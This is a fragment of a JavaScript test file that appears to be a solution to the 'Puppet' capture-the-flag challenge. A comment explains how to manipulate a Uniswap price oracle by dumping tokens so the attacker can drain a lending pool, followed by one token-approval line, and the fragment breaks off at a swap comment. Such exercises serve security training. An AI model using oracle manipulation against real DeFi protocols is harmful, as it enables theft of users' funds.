...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        /** The goal is to manipulate the Uniswap price oracle such that the amount of tokens
            exceeds the amount of ETH locked in pool, thereby making the price of the pair very small.
            This allows us to steal all the tokens. We do this by sending our surplus DVT tokens to Uniswap.
        */

        // approve tokens from attacker to uniswap
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        //Swap tokens for ETH to manipulate price 
